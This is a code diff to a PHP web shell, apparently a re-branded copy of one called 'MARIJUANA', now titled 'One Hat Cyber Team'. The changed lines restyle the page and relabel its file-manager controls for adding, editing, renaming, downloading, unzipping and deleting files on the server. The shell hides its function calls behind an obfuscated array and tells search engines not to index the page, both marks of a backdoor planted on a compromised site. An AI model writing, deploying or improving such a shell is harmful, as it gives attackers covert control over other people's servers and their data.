@@ -52,21 +52,40 @@ for($i=0;$i<$___;$i++) {
 			<meta charset="UTF-8">
 			<meta name="robots" content="NOINDEX, NOFOLLOW">
 
-				<title>MARIJUANA</title>
+				<title></title>
 
-			<link rel="icon" href="//0x5a455553.github.io/MARIJUANA/icon.png" />
+			<link rel="icon" href="https://i.top4top.io/p_1863uesgi0.gif" />
                         <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css">
 
 			<script src="//ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 			<script src="//cdnjs.cloudflare.com/ajax/libs/notify/0.4.2/notify.min.js"></script>
 <style>
 @import url('https://fonts.googleapis.com/css2?family=Kelly+Slab&display=swap');
+@import url('https://fonts.googleapis.com/css2?family=Satisfy&display=swap');
 html {
-    margin-left: 1em!important;
-    margin-right: 1em!important;
-    margin-top: -1.5em!important;
-    background: #00bfff!important;
+    margin-left: 5px!important;
+    margin-right: 5px!important;
+    margin-bottom: 5px!important;
+    margin-top: 5px!important;
+    background: #545454cc!important;
     font-family: 'Kelly Slab'!important;
+    border: 2px solid black!important;
+    border-radius: 10px!important;
+}
+.g {
+text-align:center!important;
+color: lime;
+font-weight: normal!important;
+}
+.left {
+text-align: left;
+}
+.right {
+text-align: right;
+}
+.k {
+    font-size: xxx-large;
+    font-family: 'Satisfy';
 }
 .x {
 text-align:center;
@@ -86,6 +105,7 @@ margin-top: 2px;
 article {
 margin-top: 5px!important;
 font-size: medium!important;
+font-weight: bold!important;
 }
 .i {
 float:left;
@@ -140,7 +160,7 @@ text-align:left;
 color:#000;
 }
 .r:hover {
-background: #0299cc!important;
+background: #868585!important;
 }
 .l {
 border:1px solid #181818;
@@ -193,19 +213,20 @@ input {
 .h {
 color:#ea2027;
 }
+tfoot {
+    display: none;
+}
+table {
+padding-top: 10px!important;
+}
 </style>
 		</head>
 
 		<body>
-			<header style="margin-top: 20px;">
-				<div class="y x">
-					<a class="ajx" style="font-size: xx-large;" href="<?php echo basename($_SERVER['PHP_SELF']);?>">
-						MARIJUANA
-					</a>
-				</div>
+			<header>
 
 				<div class="q x w">
-					&#8212; DIOS &#8212; NO &#8212; CREA &#8212; NADA &#8212; EN &#8212; VANO &#8212;
+					<a class="k" href="<?php echo basename($_SERVER['PHP_SELF']);?>">One Hat Cyber Team</a>
 				</div>
 				
 			</header>
@@ -498,50 +519,24 @@ color:#ea2027;
 						  }
 					}
 					else {
-					echo '<table cellspacing="0" cellpadding="7" width="100%">
-						<thead>
-							<tr>
-								<th width="44%">[ NAME ]</th>
-								<th width="11%">[ SIZE ]</th>
-								<th width="17%">[ PERM ]</th>
-								<th width="17%">[ DATE ]</th>
-								<th width="11%">[ ACTION ]</th>
-							</tr>
-						</thead>
-						<tbody>
-							<tr>
-								<td>
-									<a class="ajx" href="?d='.hex($d).'&n" style="
--webkit-appearance: button!important;
-cursor: pointer!important;
-font-size: medium!important;
-border: 1.5px solid black!important;
-border-radius: 5px!important;
-margin-top: 5px!important;
-margin-left: 5px!important;
-padding-left: 10px!important;
-padding-right: 10px!important;
-padding-bottom: 3px!important;
-background: transparent!important;
-padding-top: 1px!important;
-"><b>Add File</b></a>
-									<a class="ajx" href="?d='.hex($d).'&l" style="
--webkit-appearance: button!important;
-cursor: pointer!important;
-font-size: medium!important;
-border: 1.5px solid black!important;
-border-radius: 5px!important;
-margin-top: 5px!important;
-margin-left: 5px!important;
-padding-left: 10px!important;
-padding-right: 10px!important;
-padding-bottom: 3px!important;
-background: transparent!important;
-padding-top: 1px!important;
-"><b>Add Directory</b></a>
-								</td>
-							</tr>
-						';
+					echo '
+<table cellspacing="0" cellpadding="7" width="100%">
+  <thead>
+    <tr>
+      <th>NAME</th>
+      <th>SIZE</th>
+      <th>PERMISSION</th>
+      <th>DATE</th>
+      <th width="30%" colspan="4">ACTION</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>
+      <a class="ajx" href="?d='.hex($d).'&n" style="-webkit-appearance: button;cursor: pointer;font-size: medium;border: 1.5px solid black;border-radius: 5px;margin-top: 5px;margin-left: 5px;padding-left: 10px;padding-right: 10px;padding-bottom: 3px;background: transparent;padding-top: 1px;"><b>Add File</b></a>
+      <a class="ajx" href="?d='.hex($d).'&l" style="-webkit-appearance: button;cursor: pointer;font-size: medium;border: 1.5px solid black;border-radius: 5px;margin-top: 5px;margin-left: 5px;padding-left: 10px;padding-right: 10px;padding-bottom: 3px;background: transparent;padding-top: 1px;"><b>Add Directory</b></a>
+      </td>
+    </tr>';
 
 							$h = "";
 							$j = "";
@@ -553,7 +548,7 @@ padding-top: 1px!important;
 									$zi = '';
 								}
 								else {
-									$zi = '<a href="?d='.hex($e).'&z='.hex($c).'">U</a>';
+									$zi = '<td class="left"><a href="?d='.hex($e).'&z='.hex($c).'">Unzip</a></td>';
 								}
 								if($GNJ[31]("$d/$c")) {
 										$o = "";
@@ -582,14 +577,17 @@ padding-top: 1px!important;
 								dir
 							</td>
 							<td class="x">
-								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
+								<a class="g'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
 							</td>
 							<td class="x">
 								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
 							</td>
-							<td class="x">
-								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
-								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
+							<td class="right">
+								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">Rename</a></td>
+<td class="x"></td>
+<td class="x"></td>
+                                                        <td class="left">
+								<a href="?d='.hex($e).'&x='.hex($c).'">Delete</a>
 							</td>
 						</tr>
 						
@@ -603,19 +601,22 @@ padding-top: 1px!important;
 							<td class="x">
 								'.$s.'
 							</td>
-							<td class="x">
-								<a class="ajx'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
+							<td class="g">
+								<a class="g'.$o.'" href="?d='.hex($e).'&k='.hex($c).'">'.x("$d/$c").'</a>
 							</td>
 							<td class="x">
 								<a class="ajx" href="?d='.hex($e).'&t='.hex($c).'">'.$GNJ[20]("Y-m-d H:i", $GNJ[21]("$d/$c")).'</a>
 							</td>
-							<td class="x">
-								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">R</a>
-								<a class="ajx" href="?d='.hex($e).'&e='.hex($c).'">E</a>
-								<a href="?d='.hex($e).'&g='.hex($c).'">G</a>
-								'.$zi.'
-								<a href="?d='.hex($e).'&x='.hex($c).'">D</a>
+							<td class="right">
+								<a class="ajx" href="?d='.hex($e).'&r='.hex($c).'">Rename</a></td>
+                                                                <td class="x">
+								<a class="ajx" href="?d='.hex($e).'&e='.hex($c).'">Edit</a></td>
+                                                                <td class="x">
+								<a href="?d='.hex($e).'&g='.hex($c).'">Download</a></td>
+								
+                                                                <td class="left"><a href="?d='.hex($e).'&x='.hex($c).'">Delete</a>
 							</td>
+'.$zi.'
 						</tr>
 						
 						';
@@ -627,7 +628,9 @@ padding-top: 1px!important;
 						echo $h;
 						echo $j;
 						echo '</tbody>
-						<tfoot>
+						<tfoot style="
+    display: none;
+">
 							<tr>
 								<th class="et">
 									<a class="ajx" href="?d='.hex($e).'&y" style="
@@ -670,9 +673,6 @@ padding-top: 1px!important;
 					?>
 
 			</article>
-			<footer class="x">
-				&copy;TheAlmightyZeus
-			</footer>
 			<?php
 			if(isset($_GET["1"])) {
 				echo $f;
